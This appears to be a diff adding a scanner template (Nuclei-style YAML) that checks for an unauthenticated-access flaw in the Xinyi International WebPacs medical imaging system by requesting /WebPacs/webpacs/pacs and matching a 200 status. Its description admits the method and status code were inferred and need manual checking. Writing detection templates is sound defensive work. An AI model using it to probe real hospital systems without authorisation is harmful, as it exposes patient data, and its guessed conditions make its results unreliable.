@@ -1,0 +1,22 @@
+id: poc-09efe5c3cd2317de5ea4
+info:
+  name: 心医国际WebPacs系统存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/09efe5c3cd2317de5ea4ca5f33915518
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 09efe5c3cd2317de5ea4ca5f33915518
+http:
+- raw:
+  - 'GET /WebPacs/webpacs/pacs HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
